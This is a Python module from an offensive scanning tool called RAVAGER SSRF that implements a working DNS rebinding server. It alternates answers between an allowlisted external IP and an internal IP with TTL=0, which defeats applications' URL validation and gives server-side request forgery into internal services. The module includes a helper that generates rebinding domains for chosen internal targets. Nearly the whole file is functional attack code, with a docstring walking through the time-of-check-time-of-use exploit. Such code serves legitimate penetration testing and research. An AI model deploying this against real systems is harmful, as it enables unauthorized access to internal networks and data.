"""
RAVAGER SSRF v2.0.0 — Active DNS Rebinding Server
=======================================================
Lightweight DNS server for performing real TOCTOU (Time-of-Check-Time-of-Use)
attacks via DNS rebinding.

How DNS rebinding TOCTOU works:
  1. The target application receives a URL like http://rebind-c0a80001-7f000001.cf.local/
  2. The app's URL validator resolves the domain → gets 192.168.0.1 (external, passes allowlist)
  3. The app then makes the actual HTTP request, resolving the domain AGAIN
  4. This time the DNS server returns 127.0.0.1 (internal, bypasses the validation)
  5. The app fetches content from the internal service, achieving SSRF

This works because most applications separate the validation step from the
fetch step, and DNS TTL=0 forces re-resolution on each request.

Domain format: rebind-<external_hex>-<internal_hex>.<base_domain>
  - external_hex: IPv4 address as 8-char hex (first resolution)
  - internal_hex: IPv4 address as 8-char hex (second resolution)
  - base_domain:  configurable (default: cf.local)

Requirements:
  - dnslib>=0.9.24 (in requirements.txt)
  - DNS delegation or cooperating resolver pointing to this server
  - --dns-rebind CLI flag to activate

Usage:
  rage http://target.com --dns-rebind --oob-wait 120
"""

from __future__ import annotations
import ipaddress
import logging
import re
import threading
from collections import defaultdict
from typing import Any

logger = logging.getLogger(__name__)

# Guard import — dnslib is optional
try:
    from dnslib import DNSRecord, RR, QTYPE, A as DNS_A
    from dnslib.server import DNSServer, BaseResolver
    _HAS_DNSLIB = True
except ImportError:
    _HAS_DNSLIB = False
    BaseResolver = object  # type: ignore[misc,assignment]

# Pattern: rebind-<8hex_external>-<8hex_internal>.<base>
_REBIND_RE = re.compile(
    r"^rebind-([0-9a-f]{8})-([0-9a-f]{8})\.",
    re.IGNORECASE,
)


class RebindDNSResolver(BaseResolver):  # type: ignore[misc]
    """
    DNS resolver that alternates responses between two IPs.

    First query for a domain  → external IP (passes allowlist)
    Second query              → internal IP (bypasses validation)
    Subsequent queries        → alternate between the two

    All responses use TTL=0 to force re-resolution.
    """

    def __init__(self, base_domain: str = "cf.local") -> None:
        self.base_domain = base_domain.rstrip(".")
        # Track query count per domain for flip logic
        self._query_count: dict[str, int] = defaultdict(int)
        self._stats = {
            "total_queries": 0,
            "rebind_flips": 0,
            "unmatched_queries": 0,
        }

    def resolve(self, request: Any, handler: Any) -> Any:
        """Handle a DNS query. Alternate IPs based on query count."""
        reply = request.reply()
        qname = str(request.q.qname).rstrip(".")
        qtype = QTYPE[request.q.qtype]

        self._stats["total_queries"] += 1

        if qtype != "A":
            # Only handle A records
            return reply

        match = _REBIND_RE.match(qname)
        if not match:
            self._stats["unmatched_queries"] += 1
            logger.debug("DNS query for non-rebind domain: %s", qname)
            return reply

        ext_hex = match.group(1)
        int_hex = match.group(2)

        try:
            external_ip = str(ipaddress.IPv4Address(int(ext_hex, 16)))
            internal_ip = str(ipaddress.IPv4Address(int(int_hex, 16)))
        except (ValueError, OverflowError):
            logger.warning("Invalid hex IPs in domain: %s", qname)
            return reply

        # Flip logic: even count → external, odd count → internal
        count = self._query_count[qname]
        self._query_count[qname] += 1

        if count % 2 == 0:
            resolved_ip = external_ip
            logger.info(
                "DNS rebind [%s] query #%d → %s (external, passes allowlist)",
                qname, count + 1, resolved_ip,
            )
        else:
            resolved_ip = internal_ip
            self._stats["rebind_flips"] += 1
            logger.info(
                "DNS rebind [%s] query #%d → %s (internal, TOCTOU bypass!)",
                qname, count + 1, resolved_ip,
            )

        # TTL=0 forces re-resolution on every request
        reply.add_answer(
            RR(qname + ".", QTYPE.A, rdata=DNS_A(resolved_ip), ttl=0)
        )
        return reply

    @property
    def stats(self) -> dict:
        return dict(self._stats)


class RebindServer:
    """
    Manages the lifecycle of the DNS rebinding server.

    Runs in a background thread so it doesn't block the async scan loop.
    """

    def __init__(
        self,
        base_domain: str = "cf.local",
        port: int = 5333,
        address: str = "0.0.0.0",
    ) -> None:
        if not _HAS_DNSLIB:
            raise ImportError(
                "dnslib is required for DNS rebinding. "
                "Install with: pip install dnslib>=0.9.24"
            )

        self.base_domain = base_domain
        self.port = port
        self.address = address
        self._resolver = RebindDNSResolver(base_domain)
        self._server: DNSServer | None = None
        self._thread: threading.Thread | None = None

    def start(self) -> None:
        """Start the DNS server in a background thread."""
        self._server = DNSServer(
            self._resolver,
            port=self.port,
            address=self.address,
        )
        self._server.start_thread()
        logger.info(
            "DNS rebinding server started on %s:%d (base: %s)",
            self.address, self.port, self.base_domain,
        )

    def stop(self) -> None:
        """Stop the DNS server."""
        if self._server:
            self._server.stop()
            self._server = None
            logger.info("DNS rebinding server stopped")

    def generate_domains(
        self,
        external_ip: str,
        internal_targets: list[str],
    ) -> list[str]:
        """
        Generate rebinding domain names for a set of internal targets.

        Args:
            external_ip:     IP that passes the target's allowlist
            internal_targets: Internal IPs to reach via TOCTOU

        Returns:
            List of domains in format rebind-<ext_hex>-<int_hex>.<base>
        """
        domains: list[str] = []
        try:
            ext_hex = format(int(ipaddress.IPv4Address(external_ip)), "08x")
        except ValueError:
            logger.warning("Invalid external IP for rebinding: %s", external_ip)
            return domains

        for target in internal_targets:
            try:
                int_hex = format(int(ipaddress.IPv4Address(target)), "08x")
            except ValueError:
                continue
            domains.append(f"rebind-{ext_hex}-{int_hex}.{self.base_domain}")

        return domains

    @property
    def stats(self) -> dict:
        return self._resolver.stats

    @property
    def is_running(self) -> bool:
        return self._server is not None


def is_available() -> bool:
    """Check if dnslib is installed and DNS rebinding is possible."""
    return _HAS_DNSLIB
